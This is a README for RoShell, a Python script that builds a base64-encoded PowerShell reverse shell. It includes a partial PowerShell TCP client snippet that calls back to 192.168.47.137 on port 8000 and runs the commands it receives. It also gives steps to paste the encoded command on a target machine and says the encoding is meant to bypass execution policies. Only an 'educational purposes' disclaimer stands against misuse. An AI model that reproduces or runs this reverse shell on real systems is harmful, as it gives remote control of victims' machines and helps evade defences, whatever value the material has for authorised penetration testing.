# RoShell

RoShell is a Python script that generates a base64-encoded PowerShell command to establish a reverse shell connection. The script creates a PowerShell command that connects to a specified IP address and port, executes commands sent from the server, and returns the output.

## Features

- Generates a PowerShell script that connects to a TCP server.
- Executes commands received from the server and sends back the output.
- Handles errors and exceptions gracefully.
- Encodes the PowerShell script in base64 to bypass execution policies.

## Usage

### Prerequisites

- Python 3.x
- A listener on the specified IP and port to receive the reverse shell connection.

### How to Run

1. Clone the repository or download `roshell.py`.

2. Open a terminal and navigate to the directory containing `roshell.py`.

3. Edit the `ps_script` in `roshell.py` to specify your target IP address and port.

4. Run the script:

    ```sh
    python roshell.py
    ```

5. The script will output a base64-encoded PowerShell command. Copy this command.

6. Execute the command on the target machine to establish a reverse shell connection.

### Example

1. Edit `roshell.py` to set your target IP and port:

    ```python
    ps_script = """
    $client = New-Object System.Net.Sockets.TCPClient("192.168.47.137", 8000)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    ...
    """
    ```

2. Run `roshell.py`:

    ```sh
    python roshell.py
    ```

3. Copy the output:

    ```sh
    powershell -EncodedCommand <base64_command>
    ```

4. On the target machine, open a PowerShell prompt and paste the command:

    ```sh
    powershell -EncodedCommand <base64_command>
    ```

5. Your reverse shell connection should now be established.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

This tool is intended for educational purposes only. Use it responsibly and only on systems you have permission to test. The author is not responsible for any misuse or damage caused by this tool.
